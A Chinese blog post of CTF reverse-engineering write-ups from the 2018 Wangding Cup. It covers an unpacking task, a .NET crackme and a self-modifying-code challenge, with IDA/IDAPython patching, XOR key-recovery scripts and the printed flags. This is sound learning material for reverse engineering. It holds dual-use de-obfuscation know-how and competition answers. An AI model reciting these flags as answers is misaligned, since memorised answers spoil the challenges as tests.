+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417172915512.png" alt="走起！"></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417173008090.png" alt></p>
+<p>0x400000，64位动态链接ELF的基地址。dump 0x400000-0x611000</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/783FCB40E57DAE1542350DAEA00E5196.jpg" alt="dump"></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174136085.png" alt="ida"></p>
+<p>简单的乱序数组。 ida 的 0xf0e0 地址处于堆，数据为空，不晓得为何。 </p>
+<p>gdb 查看内存</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174322395.png" alt></p>
+<p>很好，写脚本，出flag</p>
+<pre><code>mem=[0x00000003,      0x00000004 ,     0x00000005,     0x00000006,
+0x00000007,      0x00000008 ,     0x00000009,     0x0000000a,
+0x0000000b,      0x0000000c ,     0x00000034,     0x00000035,
+0x00000036,      0x00000037 ,     0x00000038,     0x00000039,
+0x00000000,      0x00000000 ,     0x00000000,     0x00000000]
+
+a = [11, 8, 7, 7, 8, 12, 3, 2, 16, 6, 13, 5, 7, 16, 4, 1, 0, 15, 16, 8, 3, 6, 14, 16, 0, 8, 6, 9, 12, 14, 13, 11, 15, 7, 11,14]
+
+for i in range(36):
+    print(chr(mem[a[i]]+45),end=&#39;&#39;)</code></pre><p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174443823.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174502697.png" alt="开心"></p>
+<p><strong>To-do</strong></p>
+<ol>
+<li>upx 脱壳失败原因。</li>
+<li>gdb 反调试原理。</li>
+<li>调试多进程。 </li>
+<li>dump 内存。</li>
+<li>脱壳技术，ESP定律。</li>
+</ol>
+<p><strong>加壳</strong></p>
+<p>加壳是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，做一些额外的工作。大多数病毒就是基于此原理。是应用加固的一种手法对原始二进制原文进行加密/隐藏/混淆。</p>
+<p>加壳原因：</p>
+<ol>
+<li>增加破解难度。</li>
+<li>对于恶意软件来说，绕过杀毒软件查杀。 </li>
+</ol>
+<p>* 优势: ①、保护自己核心代码算法,提高破解/盗版/二次打包的难度 ②、还可以缓解代码注入/动态调试/内存注入攻击. </p>
+<ul>
+<li>劣势: ①、影响兼容性 ②、影响程序运行效率.</li>
+</ul>
+<h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>这是一道 简单的 .NET 逆向题。使用 dnSpy 动态调试，能看到反编译的源码。</p>
+<p>工欲善其事必先利其器，找到合适的利器事半功倍。dnSpy </p>
+<blockquote>
+<p>常见语言的反编译反汇编工具:</p>
+<p>C/C++: IDA Pro</p>
+<p>.NET: dnSpy 、 JetBrains dotPeek</p>
+<p>python: uncompyle6 </p>
+</blockquote>
+<p>调试方法：</p>
+<ol>
+<li>打开程序，点击运行，点 flag 按钮。</li>
+<li>代码窗口停留在了 messagebox 当中。</li>
+<li>跳出库函数，来到了 WindowsApp1</li>
+<li>flag 明文写在了 Form1 和 Form1_Load 当中。</li>
+</ol>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200418000713454.png" alt></p>
+<p><strong>Todo</strong></p>
+<ol>
+<li><p>多练一道 .NET 逆向题。 </p>
+</li>
+<li><p>了解工具 </p>
+<blockquote>
+<p><a href="https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=124" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=124</a></p>
+</blockquote>
+</li>
+</ol>
+<h3 id="SimpleSMC"><a href="#SimpleSMC" class="headerlink" title="SimpleSMC"></a>SimpleSMC</h3><p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211121049.png" alt></p>
+<p>程序是静态链接编译的 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211203776.png" alt></p>
+<p>随机输入发生段错误。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211243535.png" alt></p>
+<p>导入 FLIRT 签名文件</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211326592.png" alt></p>
+<p>选择最近的环境。 此处是 ubuntu16.04 。原因如下。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211411581.png" alt></p>
+<p>导入签名文件后，左侧的函数名称恢复了大部分。搜索字符串定位到 main。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211551441.png" alt></p>
+<p>loc_400bac 用到了参数 v5， v5 是 输入的一部分。相对对v4偏移21个字节。 从伪代码可以看出，当两个函数返回真时，就破解成功了。 </p>
+<p>点进 loc_400bac 函数，看看有什么宝贝。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211802158.png" alt></p>
+<p>0x400bc8 有花指令。 花指令的存在干扰我们阅读反汇编代码，增加破解难度。 我们需要去花。 0x400bbc 直接跳转到 loc_400bc9 ，那直接把 0x400bc8 一个字节 E8 nop 掉（改成 0x90) 。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212325016.png" alt></p>
+<p>左侧红棕色可以看出，这部分汇编代码运行不了。因为它构成完整的函数调用。 右键生成函数。 F5 看源码</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212538679.png" alt></p>
+<p>loc_400aa6 的连续若干字节被改了。text段可改。怪不得叫 SMC (Self Modify Code) 。 应该调用了 mprotect ，去验证猜想。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212701551.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212724499.png" alt></p>
+<p>F5 看源码弹出错误，修改一下 sp 值调整为栈平衡。 (alt + K 快捷键)。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213102752.png" alt></p>
+<p><code>add rsp,4</code>  ，故在 leave 之前平衡栈顶，修改后，即可 F5。 但存在花指令干扰。按照刚才的方法去花。再看源码。 可以适当去掉一些跳转指令，可以使得源码更好看。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213226848.png" alt="call =&gt; nop"></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213548446.png" alt></p>
+<p>验证了调用 mprotect 的猜想。 19行 和 sub_41e1b0 进行了异或变换。 注意到 -61=0xc3 ，是 ret指令的机器码。 所以执行到 sub_400bac 函数时， loc_400aa6 函数块的数据早已被修改。 这里的数据需要动态调试获得，或者IDAPython直接改text的内容。</p>
+<p>返回到 400bac 函数看看。 a1[0..6] 七个字节异或，这个7个字节的key要猜测。 loc_0x400aa6 是一个完整的函数。那么开头指令必定是 <code>push rbp; mov rbp, rsp; sub rsp ???</code>  对应的指令为 <code>55 48 89 E5 48 83 EC</code></p>
+<p> <img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213918114.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421215404190.png" alt></p>
+<p>下断到这里查看内容。</p>
+<p> <img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421215439914.png" alt></p>
+<p>拷贝前六个字节，写脚本得出key</p>
+<pre><code class="ruby">data=[0x13 ,0x79 ,0xc9 ,0x82 ,0x0b ,0xeb,0x89]
+fcode=[0x55 ,0x48 ,0x89 ,0xE5 ,0x48 ,0x83 ,0xEC]
+key=&#39;&#39;
+(0..6).each do |i| key&lt;&lt;(fcode[i]^data[i]).chr end
+puts key</code></pre>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220034417.png" alt></p>
+<p>key=F1@gChe</p>
+<p>写进IDAPthon修改 loc_400aa6 处的数据。 </p>
+<pre><code class="python">key=&#39;F1@gChe&#39;
+
+addr=0x400aa6 
+malloc_addr=0x041E1B0
+
+i=0
+while(Byte(addr+i)!=0xc3):
+    PatchByte(addr+i,Byte(addr+i)^Byte(malloc_addr+i))
+    i+=1
+
+i=0
+while(Byte(addr+i)!=0xc3):
+    PatchByte(addr+i,Byte(addr+i)^ord(key[i%7]))
+    i+=1 
+</code></pre>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220336901.png" alt></p>
+<p>按d可以转换数据为code，方便我们阅读汇编，美化后，按 F5，完美。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220508503.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220519609.png" alt></p>
+<p>折半异或。逆序异或即可得出flag。 第一次做出这么复杂的逆向。 嗨森  ;-)</p>
+<p><strong>解密脚本</strong></p>
+<pre><code class="ruby">#/bin/ruby
+key=[ 0x66, 0x0A, 0x07, 0x0B, 0x1D, 0x08, 0x51, 0x38, 0x1F, 0x5C,  0x14, 0x38, 0x30, 0x0A, 0x1A, 0x28, 0x39, 0x59, 0x0C, 0x24,  0x24, 0x22, 0x01, 0x1F, 0x1E, 0x73, 0x1D, 0x3A, 0x08, 0x05, 0x15, 0x0A]
+s=&#39;&#39;
+i=1 
+until i==32 do (0..i-1).each do |k| key[k+i] ^= key[k]  end ; i &lt;&lt;= 1 end 
+
+key.each do |i| s&lt;&lt;i.chr end
+
+puts s
+
+#flag{d0_y0u_Kn*w_5mC_F1@gCheCk?}</code></pre>
+<p><strong>Todo</strong></p>
+<ol>
+<li>编译静态链接程序，在IDA中恢复符号表 <a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">https://github.com/push0ebp/sig-database</a></li>
+</ol>
+<h2 id="网鼎杯RE考点"><a href="#网鼎杯RE考点" class="headerlink" title="网鼎杯RE考点"></a>网鼎杯RE考点</h2><ol>
+<li>python字节码  自己写一个。</li>
+<li>花指令去除 </li>
+<li>.NET 动态调试。</li>
+<li>反调试、加壳技术。 </li>
+</ol>
+<h2 id="逆向例题"><a href="#逆向例题" class="headerlink" title="逆向例题"></a>逆向例题</h2><p>推荐：<a href="https://capturetheflag.withgoogle.com/#beginners/reversing-rand2" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#beginners/reversing-rand2</a></p>
+<p>JavisOJ Crackme1 Crackme2 </p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>OD使用教程 <a href="https://blog.csdn.net/dyxcome/article/details/91348410" target="_blank" rel="noopener">https://blog.csdn.net/dyxcome/article/details/91348410</a> </p>
+<p>逆向工具<a href="https://down.52pojie.cn/Tools/PEtools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/PEtools/</a></p>
+<p>关闭aslr <a href="http://www.sweetscape.com/download/010EditorWin64Installer.exe" target="_blank" rel="noopener">http://www.sweetscape.com/download/010EditorWin64Installer.exe</a> </p>
+<p>vmpy <a href="https://medium.com/@julianrunnels/google-ctf-reversing-a-program-made-of-emojis-b4c8af473278" target="_blank" rel="noopener">https://medium.com/@julianrunnels/google-ctf-reversing-a-program-made-of-emojis-b4c8af473278</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>2018网鼎杯</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-04-15, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-21, 22:11:24</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/" title="2018网鼎杯">https://primelyw.github.io/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 枫云李</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#Pwn','#CTF','#CVE','#fuzz','#afl','#Defcon','#ruby','#lang',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("/img/article-list-bg.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+    .post .pjax article :not(pre) > code {
+        color: #24292e;
+        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+        background-color: rgba(27,31,35,.05);
+        border-radius: 3px;
+        font-size: 85%;
+        margin: 0;
+        padding: .2em .4em;
+    }
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
+    
+</div>
+
+
+</html>
